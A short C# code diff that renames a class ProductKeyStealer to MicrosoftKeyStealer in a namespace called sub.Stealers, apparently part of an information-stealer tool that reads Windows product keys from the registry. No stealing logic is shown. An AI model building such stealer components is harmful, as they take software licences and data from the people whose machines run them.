@@ -8,7 +8,7 @@ using Microsoft.Win32;
 
 namespace sub.Stealers
 {
-    internal class ProductKeyStealer : IStealer
+    internal class MicrosoftKeyStealer : IStealer
     {
         private string _name = "ProductKeyStealer";
 
